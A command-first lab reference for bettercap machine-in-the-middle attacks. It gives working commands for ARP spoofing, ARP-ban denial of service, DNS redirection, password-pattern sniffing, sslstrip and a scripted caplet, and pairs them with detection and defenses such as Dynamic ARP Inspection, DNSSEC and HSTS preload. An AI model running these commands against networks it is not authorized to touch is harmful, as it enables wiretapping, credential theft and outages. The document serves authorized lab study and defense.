# MITM with bettercap — Command-First Lab Reference

> Scope: **authorized, own-device lab only** (your own AP + your own client, a sanctioned
> CTF range, or an OSWP/OSCP study lab you control). Every technique below is paired with its
> defense. Evil-twin / credential capture is covered as **detection + concept only** — this
> file deliberately does **not** wire up a credential/keystroke harvester.
> Running any of this against traffic you are not authorized to intercept is illegal (wiretap /
> CFAA-class offenses). When in doubt, stop.

---

## 0. Concept (brief)

ARP has no authentication. Every host on an Ethernet/Wi-Fi L2 segment trusts an unsolicited ARP
reply that says "IP `x` is at MAC `y`." **ARP spoofing** poisons the victim's (and optionally the
gateway's) ARP cache so your box becomes the path between the victim and the router — a
**machine-in-the-middle (MITM)**. Once you are on-path you can:

- **Sniff** cleartext and metadata (`net.sniff`),
- **Redirect name resolution** (`dns.spoof`),
- **Tamper with HTTP** (`http.proxy`), and *attempt* HTTPS downgrade (`sslstrip` / `hstshijack`) — which largely **fails** against modern browsers (see §8).

bettercap is the modern, modular MITM framework (successor to ettercap + the classic `arpspoof`/`sslstrip` tooling). You drive it through **modules** (turn on/off), **parameters** (`set`/`get`), and **caplets** (`.cap` scripts).

---

## 1. Lab setup & authorization gate

**Topology (minimum viable lab):**
```
[ Your Mac ] ── hashcat / notes / pcap analysis (Wireshark)
      │
      └── Kali VM (bridged or USB-passthrough NIC)  ← bettercap runs HERE
                │  wlan0 / eth0 on the test LAN
                ▼
      [ Test AP you own ] ── [ Victim client you own (old phone / spare laptop / Pi) ]
```

- Use a **dedicated test SSID/VLAN** that carries only your own gear. Never point bettercap at
  a production or shared network.
- Keep an **allowlist** of target MAC/IP that your tooling is permitted to touch, and make
  `arp.spoof.targets` read from it — never spoof the whole subnet in a shared lab (default
  `arp.spoof.targets` = *entire subnet*; see §5).
- Snapshot the victim's normal ARP table before you start so you can prove/verify the poison and
  restore afterward.

**Install (Kali):**
```bash
sudo apt update && sudo apt install bettercap     # Kali package is v2.41.x+
bettercap -version
# Runtime deps the package pulls: libpcap0.8, libusb-1.0-0, iproute2, iptables, iw, net-tools
```
Caplets are NOT shipped in the Kali `.deb`. Pull the official ones:
```bash
sudo bettercap -eval "caplets.update; q"          # or: git clone https://github.com/bettercap/caplets
# Installs into /usr/share/bettercap/caplets  (and/or /usr/local/share/bettercap/caplets)
```

---

## 2. bettercap fundamentals (the 10 commands you actually use)

```bash
sudo bettercap -iface wlan0                        # start interactive, bound to an iface (name/IP/MAC ok)
sudo bettercap -iface wlan0 -caplet mylab.cap      # start and run a caplet by path
sudo bettercap -iface wlan0 -caplet mylab          # ...or by name (search path below)
sudo bettercap -iface wlan0 -eval "set arp.spoof.targets 192.168.50.20; arp.spoof on"
```

Inside the session:
```
help                     # list ALL commands + every module's running/not-running status
help arp.spoof           # a module's sub-commands + its parameters (do this per module!)
active                   # show only running modules and their params
get arp.spoof.targets    # read one param        | get *  = dump everything
set net.sniff.filter "tcp port 80"   # set a param | set X "" clears it
read PARAM "Prompt:"     # prompt you for a value at runtime
net.probe on             # enable a module       | net.probe off disables it
ticker on                # run a command set on a fixed interval (monitoring)
alias DE:AD:..:EF victim-phone       # name a MAC; persists in ~/bettercap.aliases
include mylab.cap        # load+run a caplet mid-session (or just type its name)
!arp -a                  # ! runs a shell command and prints output
clear ; net.show         # chain commands with ;
q                        # quit (restores spoofed caches on exit)
```

**Caplet name search order** (for `-caplet name` / `include name`):
`./name.cap` → `./caplets/name.cap` → `$CAPSPATH` dirs → `/usr/local/share/bettercap/caplets/name.cap`.

---

## 3. Decision order — the sequence pros actually run

1. **Bind the right interface.** `-iface wlan0`. Confirm it's up and on the test LAN.
2. **Recon the segment.** `net.recon` (passive, on by default) then a short burst of `net.probe`
   (active) to populate the host table fast; `net.show` to read it. Identify gateway + victim.
3. **Scope the target.** `set arp.spoof.targets <victim-ip>` (never leave it at whole-subnet in a
   shared lab). Add a whitelist if needed.
4. **Decide duplex/ban.** half-duplex (default) vs `arp.spoof.fullduplex true`; or `arp.ban` if you
   only want to *deny* service (DoS test), not intercept.
5. **Turn off `net.probe` before `arp.spoof on`** (see §Gotchas — this is the #1 mistake).
6. **Start the MITM.** `arp.spoof on`. bettercap auto-enables IP forwarding on Linux.
7. **Layer the payload module:** `net.sniff` (observe), and/or `dns.spoof` (redirect), and/or
   `http.proxy` (tamper). DNS/HTTP modules require the ARP spoof to be live to actually see victim
   traffic.
8. **Verify** on the victim (ARP table shows your MAC for the gateway; traffic flows).
9. **Collect** to pcap, analyze on the Mac in Wireshark.
10. **Tear down cleanly:** stop modules, `q` (bettercap re-ARPs correct values), confirm victim
    recovers.

---

## 4. Recon (map the segment first)

```
net.recon on          # passive host discovery (default ON); watches ARP it sees
net.probe on          # ACTIVE: sprays UDP to every host in the subnet -> finds hosts fast
net.show              # print the discovered hosts table (IP, MAC, vendor, last-seen)
net.show 192.168.50.20
events.stream on       # (usually autostarted) live event feed: new hosts, etc.
```
Pro move: `net.probe on`, wait ~5–10 s, `net.probe off`. A probe burst usually finds more hosts
than passive recon alone — then turn it **off** before spoofing.

---

## 5. ARP spoofing — exact parameters (official defaults)

| Command / parameter | Default | Meaning |
|---|---|---|
| `arp.spoof on` / `off` | — | start/stop the ARP spoofer |
| `arp.ban on` / `off` | — | spoof in **ban mode**: victim loses connectivity (DoS), no forwarding |
| `arp.spoof.targets` | **entire subnet** | comma list of MACs / IPs / IP ranges / aliases to poison |
| `arp.spoof.whitelist` | *(empty)* | same value types; hosts to **skip** |
| `arp.spoof.internal` | `false` | also poison host-to-host (internal) traffic, not just host↔gateway |
| `arp.spoof.fullduplex` | `false` | poison **both** the targets **and** the gateway (bidirectional) |
| `arp.spoof.interval` | `1000` | ms between ARP broadcasts |

**Canonical intercept (half-duplex, single target):**
```
net.probe off
set arp.spoof.targets 192.168.50.20
arp.spoof on
```
**Bidirectional (when the client is stubborn / you need both directions reliably):**
```
set arp.spoof.fullduplex true
arp.spoof on
```
**Internal (device-to-device within the LAN, e.g. victim ↔ NAS):**
```
set arp.spoof.internal true
```
**Ban / connectivity-denial test (no MITM, just cut the host off):**
```
set arp.spoof.targets 192.168.50.20
arp.ban on
```

Notes:
- Starting `arp.spoof` makes bettercap **auto-configure the OS for MITM** (enables
  `net.ipv4.ip_forward` on Linux). If you ever run the primitives by hand, set it yourself:
  `sysctl -w net.ipv4.ip_forward=1`.
- **fullduplex + a gateway that has ARP-spoof protection → the attack fails.** Half-duplex (poison
  only the client) is the fallback when the router rejects gratuitous ARP for itself.
- Spoofer `arp.spoof.type`/transport can be ARP (default), with ICMP and NONE variants in some
  builds — always confirm with `help arp.spoof` on *your* version.

---

## 6. DNS spoofing — exact parameters (official defaults)

| Command / parameter | Default | Meaning |
|---|---|---|
| `dns.spoof on` / `off` | — | start/stop the DNS spoofer |
| `dns.spoof.address` | *(interface address)* | IP that spoofed domains resolve to |
| `dns.spoof.all` | `false` | if true, reply to **every** DNS request; else only requests aimed at the local machine |
| `dns.spoof.domains` | *(empty)* | comma list of domains to spoof |
| `dns.spoof.hosts` | *(empty)* | path to a hosts-style file (`IP  domain` per line) — overrides the other params |
| `dns.spoof.ttl` | `1024` | TTL of the spoofed replies |

**Dependency (critical):** to receive queries from *other* hosts, `arp.spoof` (or `dhcp6.spoof` on
IPv6) must be **active** — DNS spoof alone only answers queries that reach your box, which is why
you poison ARP first.

**Redirect a lab domain to your box:**
```
set arp.spoof.targets 192.168.50.20
arp.spoof on
set dns.spoof.address 192.168.50.10          # your Kali IP
set dns.spoof.domains lab.example.test,*.lab.example.test
dns.spoof on
```
**Hosts-file form (cleaner for many mappings):**
```
# /root/lab.hosts
192.168.50.10  portal.lab.test
192.168.50.10  *.intranet.lab.test
```
```
set dns.spoof.hosts /root/lab.hosts
dns.spoof on
```

---

## 7. Sniffing — exact parameters (official defaults)

| Command / parameter | Default | Meaning |
|---|---|---|
| `net.sniff on` / `off` | — | start/stop sniffer+parser |
| `net.sniff.filter` | `"not arp"` | **BPF** filter (tcpdump syntax) |
| `net.sniff.regexp` | *(empty)* | only consider packets whose payload matches this regex |
| `net.sniff.local` | `false` | include packets to/from the local machine |
| `net.sniff.verbose` | `false` | emit **every** packet to events.stream, not just parsed app-layer |
| `net.sniff.output` | *(empty)* | write captured packets to a pcap file |

**Full capture to pcap (then analyze in Wireshark on the Mac):**
```
set net.sniff.local true
set net.sniff.verbose true
set net.sniff.output /root/lab-capture.pcap
net.sniff on
```
**Targeted BPF (quieter, faster):**
```
set net.sniff.filter "tcp port 80 or udp port 53"
net.sniff on
```
**Regex cred-pattern spotting (lab demo of why cleartext is dangerous):**
```
set net.sniff.regexp "(password|passwd|pwd)="
set net.sniff.verbose true
net.sniff on
```
BPF cheats: `host 192.168.50.20`, `ether proto 0x888e` (EAPOL), `port 53`, `tcp[tcpflags] & tcp-syn != 0`.

---

## 8. HTTP tamper & the HTTPS/HSTS/sslstrip **reality check** (concept + defense only)

This is where beginners waste the most time. Read this before trying it.

**http.proxy (HTTP, port 80 only):**
```
set http.proxy.sslstrip true
http.proxy on
```
`http.proxy` transparently proxies the victim's HTTP so you can observe/modify it. `sslstrip`
*attempts* to keep the victim on `http://` and rewrite `https://` links so TLS is never negotiated
to the real site.

**Why sslstrip mostly does NOT work anymore (2025/2026):**
- **HSTS** (HTTP Strict Transport Security): once a browser has seen a site's HSTS header, it
  refuses plain HTTP to it. SSLStrip depends on a downgrade, so it fails.
- **HSTS preload list**: major sites (Google, Facebook, Twitter/X, banks, etc.) are compiled into
  the browser. The browser enforces HTTPS on the **very first** connection — there is no window to
  strip, and it won't let the user click through.
- **HTTPS-first / HTTPS-Only mode**: modern Chrome/Firefox/Safari auto-upgrade `http://` to
  `https://` and warn on downgrade.
- Net effect: sslstrip only bites **non-preloaded sites the victim visits over HTTP first**, and
  even then the browser UI screams. Against a current, patched client it is largely dead.

**`hstshijack` caplet — concept, and why it's a dead end on patched gear:**
The `hstshijack` caplet tries to dodge HSTS by swapping the real hostname for a **homoglyph
look-alike** the browser has *no* HSTS entry for — e.g. `facebook.com` → `facebook.corn`
(`rn`≈`m`) — combined with a matching `dns.spoof` so the look-alike resolves to the attacker. It
works **only if the real domain is misconfigured** (HSTS header without `includeSubDomains`, or not
on the preload list). Against a correctly preloaded domain the browser never emits the look-alike
request.

> **Boundary for this lab/skill:** the stock `hstshijack` also ships a JS **payload/keylogger**
> injection path (`hstshijack.payloads`, `http.proxy.script`). We treat that as a
> **credential/keystroke harvester and keep it out of scope.** For the toolkit, stop at
> *understanding the downgrade mechanism and demonstrating that a modern browser defeats it*, then
> pivot to **detection + defense** below. Do not build or wire the harvesting payload.

**Takeaway to encode in the skill:** demonstrate the *failure* of HTTPS downgrade on a patched
victim (great teaching moment), and measure what still leaks even under TLS: **SNI**, DNS names
(unless DoH/DoT), IP/metadata, and any app that ignores cert validation.

---

## 9. Caplets — scripting a repeatable lab run

A caplet is a `.cap` file, one command per line (`#` comments). Example **own-lab** caplet that
does recon → single-target ARP spoof → scoped sniff to pcap, nothing destructive:

```bash
# file: /usr/local/share/bettercap/caplets/lab-mitm.cap
# Authorized lab only. Edit TARGET + IFACE before use.
set $iface wlan0
net.recon on
net.probe on
sleep 8
net.probe off
# --- scope to ONE authorized host ---
set arp.spoof.targets 192.168.50.20
set arp.spoof.fullduplex false
arp.spoof on
# --- observe only ---
set net.sniff.filter "not arp"
set net.sniff.output /root/lab-mitm.pcap
set net.sniff.verbose false
net.sniff on
```
Run it:
```bash
sudo bettercap -iface wlan0 -caplet lab-mitm
```
Monitoring pattern with `ticker` (print host table every 5 s):
```
set ticker.commands "clear; net.show"
set ticker.period 5
ticker on
```

---

## 10. Gotchas & pitfalls (the stuff that wastes an hour)

- **`net.probe` MUST be OFF before `arp.spoof on`.** Running both fights over the host table and
  breaks the spoof. Probe to discover, then stop probing.
- **No IP forwarding = victim loses internet.** bettercap sets it when `arp.spoof` starts; if you
  disabled it or ran primitives by hand, `sysctl -w net.ipv4.ip_forward=1`.
- **`dns.spoof` without `arp.spoof` sees nothing** from other hosts — you must be on-path first.
- **`arp.spoof.fullduplex true` fails against a protected gateway** (DAI / router-side ARP
  protection). Drop to half-duplex.
- **Default `arp.spoof.targets` = whole subnet.** Forgetting to scope it in a shared lab poisons
  everyone — always `set arp.spoof.targets` explicitly.
- **Version drift in parameter names.** Kali ships v2.41.x; old blog posts (v1.x, v2.11, v2.23)
  use stale flags. Always confirm with `help <module>` on *your* build. (SSLStrip behavior in
  particular changed across 1.x→2.x.)
- **Wi-Fi client isolation / AP guest mode** blocks L2 peer traffic → ARP spoof can't reach the
  victim. Use an AP/SSID without isolation for the lab.
- **Wireless adapter in managed mode** is fine for ARP MITM (you're an associated STA); you do
  **not** need monitor mode for ARP/DNS/sniff MITM (that's for handshake capture — different tool).
- **hstshijack look-alike domains must actually resolve** — pair every replacement with a
  `dns.spoof` entry, or the browser just errors.
- **mDNS/LLMNR/NBT-NS** name resolution can bypass your DNS spoof entirely on Windows clients —
  know they exist (separate poisoning surface, e.g. Responder) when a DNS spoof "mysteriously"
  doesn't catch a lookup.

---

## 11. Pro tips for speed

- Script everything as a caplet; don't retype. Keep `lab-mitm.cap`, `lab-dns.cap`, `lab-recon.cap`.
- `-eval "...; ...; q"` for one-shot automated steps (e.g. `caplets.update`).
- Narrow the **BPF filter early** — capturing "everything verbose" on a busy link buries the signal
  and fills disk. Start with `tcp port 80 or port 53`, widen only if needed.
- Use **aliases** (`alias <mac> victim`) so `net.show` and logs are readable.
- Analyze pcaps **off-box** in Wireshark on the Mac; bettercap's live view is for triage, not deep
  analysis. Filters: `http.request`, `dns`, `tls.handshake.extensions_server_name` (SNI leak demo).
- Keep a **restore check**: after `q`, run `arp -a` on the victim and confirm the gateway MAC is the
  real router again.

---

## 12. DEFENSE (pair every attack with this — the point of an authorized lab)

**Against ARP spoofing (the root primitive):**
- **Dynamic ARP Inspection (DAI)** on managed switches: validates ARP against the **DHCP snooping**
  binding table and drops forged replies. DHCP snooping must be enabled first (it builds the table
  DAI needs). Uplink/DHCP-server ports are set *trusted* and exempt; rate-limit untrusted ports.
- **Static ARP entries** for critical hosts (gateway, servers) so forged replies are ignored. DAI
  can't protect static-IP hosts without an ARP ACL — use static bindings there.
- **arpwatch** on gateways/critical hosts: alerts on MAC↔IP binding changes (gratuitous ARP bursts,
  gateway MAC flips). Doesn't scale to huge nets but ideal for key assets.
- **VLAN segmentation / private VLANs / Wi-Fi client isolation**: ARP spoofing is L2-local, so
  smaller broadcast domains shrink the blast radius; isolation stops STA-to-STA entirely.
- **Detection signals:** two IPs claiming the same MAC, or one IP flapping between MACs; a flood of
  unsolicited (gratuitous) ARP replies ~1/sec; the gateway's MAC suddenly changing. Watch in
  Wireshark (`arp.duplicate-address-detected`) or with bettercap's own event stream as a monitor.

**Against DNS spoofing:**
- **DNSSEC** (validates authenticity of records), **DoH/DoT** (encrypts + authenticates the
  resolver path so on-path answers are rejected), pinned/known resolvers, and short client DNS
  caches. In the lab, show that a DoH-configured browser ignores your `dns.spoof` entirely.

**Against HTTP tamper / sslstrip / downgrade:**
- **HSTS with `includeSubDomains` + preload submission**, **HTTPS-Only mode** in the browser,
  **HSTS preload** for owned domains, and **cert/public-key pinning** for apps. Demonstrate that a
  preloaded site cannot be stripped — that *is* the defense working.

**General L2/host hygiene:** 802.1X port authentication, disable LLMNR/NBT-NS/mDNS where not needed
(kills fallback name-poisoning), monitor for promiscuous-mode NICs, and alert on new gateways.

---

## 13. Clean teardown

```
arp.spoof off        # (and dns.spoof off / http.proxy off / net.sniff off)
q                    # bettercap re-sends correct ARP so caches heal
```
Then verify on the victim: `arp -a` → gateway shows the **real** router MAC; internet works.
If you set `ip_forward` by hand, reset it: `sysctl -w net.ipv4.ip_forward=0`.

---

## 14. Quick troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| Victim loses internet | IP forwarding off | `arp.spoof` should set it; else `sysctl -w net.ipv4.ip_forward=1` |
| No victim traffic seen | not actually on-path | `net.probe` still on, or wrong target; confirm victim's `arp -a` shows your MAC |
| Spoof "doesn't take" | gateway ARP protection / DAI | use half-duplex (`fullduplex false`); it's a hardened gateway |
| DNS spoof ignored | arp.spoof not active, or victim on DoH | enable `arp.spoof`; note DoH clients are immune |
| sslstrip shows nothing | HSTS/preload (working as designed) | expected on modern browsers — pivot to the defense lesson |
| Can't reach victim at all | Wi-Fi client isolation | use a lab SSID without isolation |
| Param name rejected | version drift | `help <module>` on your build; Kali is v2.41.x |

---

## Sources (actually used)

Official bettercap docs:
- arp.spoof module — https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/
- dns.spoof module — https://www.bettercap.org/modules/ethernet/spoofers/dnsspoof/
- net.sniff module — https://www.bettercap.org/modules/ethernet/netsniff/
- Interactive session / caplets / set-get — https://www.bettercap.org/usage/interactive_session/
- Ethernet spoofers overview — https://www.bettercap.org/modules/ethernet/spoofers/introduction/
- "All hail bettercap 2.0" (evilsocket, author) — https://www.evilsocket.net/2018/02/27/All-hail-bettercap-2-0-one-tool-to-rule-them-all/
- Official caplets repo — https://github.com/bettercap/caplets

Packaging / platform:
- Kali Tools: bettercap (v2.41.5, deps) — https://www.kali.org/tools/bettercap/

Workflow / command references (community, cross-checked against official):
- koutto pi-pwnbox-rogueap wiki — MitM Commands — https://github.com/koutto/pi-pwnbox-rogueap/wiki/MitM-Commands
- 7h3w4lk3r "the-hive" — bettercap / ARP spoofing / HSTS downgrade notes — https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/network-poisoning-mitm/bettercap
- StationX — Bettercap Tutorial & Top Commands (2026) — https://www.stationx.net/bettercap-tutorial/
- Debian source: bettercap-caplets (mitm6.cap / netmon.cap examples) — https://sources.debian.org/src/bettercap-caplets/

HSTS / sslstrip reality:
- jlajara — HSTS bypass analysis — https://jlajara.gitlab.io/HSTS

Defense / detection:
- Juniper — Understanding and Using Dynamic ARP Inspection (DAI) — https://www.juniper.net/documentation/us/en/software/junos/security-services/topics/topic-map/understanding-and-using-dai.html
- Extreme Networks — Dynamic ARP Inspection and DHCP Snooping — https://documentation.extremenetworks.com/slxos/sw/20xx/20.3.1/l3config/
- Fidelis Security — Detect ARP spoofing in enterprise networks — https://fidelissecurity.com/threatgeek/threat-detection-response/detect-arp-spoofing-in-enterprise-networks/
- InventiveHQ — ARP poisoning detection & prevention guide — https://inventivehq.com/blog/arp-poisoning-detection-prevention-guide/

> Parameter names and defaults in §5–§7 are taken from the official bettercap.org module pages.
> Always re-verify with `help <module>` on your installed version before relying on a flag.
